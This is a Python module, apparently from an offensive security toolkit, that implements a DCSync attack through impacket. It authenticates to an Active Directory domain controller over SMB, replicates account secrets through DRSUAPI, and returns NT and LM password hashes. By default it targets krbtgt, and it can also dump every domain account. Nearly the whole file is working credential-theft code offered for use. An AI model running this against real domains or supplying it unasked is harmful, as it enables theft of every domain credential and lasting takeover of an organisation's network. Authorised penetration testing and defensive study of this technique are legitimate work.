"""
DCSync — replicate domain controller data to extract password hashes.

Uses the MS-DRSR protocol (DRSGetNCChanges) to replicate account attributes
from a domain controller without executing code on it.  Requires Domain Admin
(or equivalent replication rights).

Under the hood this uses impacket's ``RemoteOperations`` + ``NTDSHashes``
(the same machinery as ``secretsdump.py -just-dc-user``).
"""

import logging
from typing import Any

from impacket import version  # noqa: F401  (impacket logo / banner)
from impacket.examples import logger as impacket_logger
from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
from impacket.smbconnection import SMBConnection

# Suppress impacket's noisy module-level logging
logging.getLogger("impacket").setLevel(logging.ERROR)
impacket_logger.init(ts=False, debug=False)


# ---------------------------------------------------------------------------
# Callback collector
# ---------------------------------------------------------------------------

class _DCSyncCollector:
    """Callback invoked by ``NTDSHashes`` for every replicated account.

    Parses the ``domain\\user:rid:lmhash:nthash:::`` output format and
    accumulates structured account dicts.
    """

    def __init__(self, domain_name: str, domain_sid: str | None) -> None:
        self.accounts: list[dict[str, Any]] = []
        self._domain = domain_name
        self._domain_sid = domain_sid

    def __call__(self, secret_type: int, secret: str) -> None:
        if secret_type != NTDSHashes.SECRET_TYPE.NTDS:
            return

        # Expected format:  domain\\username:rid:lmhash:nthash:::
        #               or  username:rid:lmhash:nthash:::
        parts = secret.split(":")
        if len(parts) < 4:
            return

        user_part = parts[0]
        rid = parts[1]
        lm_hash = parts[2]
        nt_hash = parts[3]

        # Strip the leading domain\ (if present) to keep only the account name
        if "\\" in user_part:
            _, username = user_part.split("\\", 1)
        else:
            username = user_part

        # Build the objectSid from the domain SID + RID
        sid = ""
        if self._domain_sid:
            sid = f"{self._domain_sid}-{rid}"

        self.accounts.append({
            "username": username,
            "rid": rid,
            "nt_hash": nt_hash,
            "lm_hash": lm_hash,
            "sid": sid,
        })


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

async def ad_dcsync(
    domain: str,
    dc_ip: str,
    username: str,
    password: str = "",
    target_user: str = "krbtgt",
    all_users: bool = False,
) -> dict:
    """Extract password hashes from a domain controller via DCSync.

    Connects to the target DC over SMB + DRSUAPI and replicates the
    specified account's attributes (or all accounts if ``all_users`` is
    ``True``).  The caller must have Domain Admin (or DS-Replication-*)
    privileges.

    Args:
        domain:      AD domain FQDN (e.g. ``"example.local"``).
        dc_ip:       IP address of a domain controller.
        username:    Account with replication privileges.
        password:    Account password.
        target_user: sAMAccountName to target (default ``"krbtgt"``).
                     Ignored when ``all_users=True``.
        all_users:   Replicate **every** domain account (default ``False``).

    Returns:
        A dict with:
        - ``domain`` / ``dc_ip`` — metadata
        - ``target_user`` / ``all_users`` — echo of input parameters
        - ``accounts`` — list of ``{"username": …, "rid": …, "nt_hash": …,
          "lm_hash": …, "sid": …}``
        - ``count`` — number of accounts returned
        - ``error`` — error message or ``None``
    """
    # Credential validation — DCSync requires an authenticated account
    if not username:
        return {
            "domain": domain,
            "dc_ip": dc_ip,
            "target_user": target_user if not all_users else "ALL",
            "all_users": all_users,
            "accounts": [],
            "count": 0,
            "error": (
                "A username is required for DCSync. Anonymous replication is "
                "not possible — the caller needs Domain Admin or equivalent "
                "DS-Replication-* privileges."
            ),
        }

    result: dict[str, Any] = {
        "domain": domain,
        "dc_ip": dc_ip,
        "target_user": target_user if not all_users else "ALL",
        "all_users": all_users,
        "accounts": [],
        "count": 0,
        "error": None,
    }

    smb_conn: SMBConnection | None = None
    remote_ops: RemoteOperations | None = None

    try:
        # ------------------------------------------------------------------
        # 1. SMB connection – used for authentication and endpoint mapping
        # ------------------------------------------------------------------
        smb_conn = SMBConnection(dc_ip, dc_ip)
        smb_conn.login(username, password, domain)

        # ------------------------------------------------------------------
        # 2. Remote operations  (SAMR + DRSUAPI setup)
        # ------------------------------------------------------------------
        remote_ops = RemoteOperations(smb_conn, doKerberos=False, kdcHost=dc_ip)
        remote_ops.connectSamr(domain)

        domain_sid = remote_ops.getDomainSid()

        # ------------------------------------------------------------------
        # 3. NTDSHashes  – performs the actual DRSUAPI replication
        # ------------------------------------------------------------------
        just_user = None if all_users else f"{domain}\\{target_user}"

        collector = _DCSyncCollector(domain, domain_sid)

        ntds_hashes = NTDSHashes(
            ntdsFile=None,  # None → online DRSUAPI method
            bootKey=None,
            isRemote=True,
            history=False,
            noLMHash=True,
            remoteOps=remote_ops,
            useVSSMethod=False,
            justNTLM=False,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=None,
            justUser=just_user,
            printUserStatus=False,
            perSecretCallback=collector,
        )

        ntds_hashes.dump()

        # ------------------------------------------------------------------
        # 4. Package results
        # ------------------------------------------------------------------
        result["accounts"] = collector.accounts
        result["count"] = len(collector.accounts)

    except Exception as exc:
        result["error"] = str(exc)
    finally:
        if remote_ops is not None:
            try:
                remote_ops.finish()
            except Exception:
                pass
        if smb_conn is not None:
            try:
                smb_conn.logoff()
            except Exception:
                pass

    return result
